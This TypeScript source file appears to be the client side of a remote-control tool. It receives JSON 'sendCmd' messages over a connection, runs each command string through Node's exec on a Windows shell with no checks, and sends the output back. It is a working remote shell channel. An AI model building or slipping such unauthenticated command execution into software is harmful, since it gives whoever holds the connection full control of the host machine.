import { id, target } from "./targetMain"
import {exec} from "child_process"
import Encoding from  'encoding-japanese'
import { createSendData } from "../functions/createSendData"

let runCmdList:string[] = []
export const getSendData = (data:string)=>{
    const getData = JSON.parse(data)
    if(getData.type === "sendCmd"){
        console.log(getData.data[0])
        const cmdList:string[] = getData.data[0].split(" ")
        let runCmd:string = "chcp 65001  &"
        runCmdList.forEach((i,index)=>{//ここおかしい

            runCmd+=`${i} & `
        })
        runCmd+=`${getData.data[0]}`
        exec(runCmd,{encoding:'utf-8'},(error: any, stdout: any, stderr: any)=>{
            if(!error && !stderr){
                const sendData = JSON.stringify(createSendData("cmdResoult",[getData.data[1],stdout]))
                target.write(sendData)
                if(cmdList[0] == "cd"){
                    runCmdList.push(getData.data[0])
                }
            }else{
                const sendData = JSON.stringify(createSendData("cmdResoult",[getData.data[1],stderr]))
                target.write(sendData)
            }
        })

    }
}
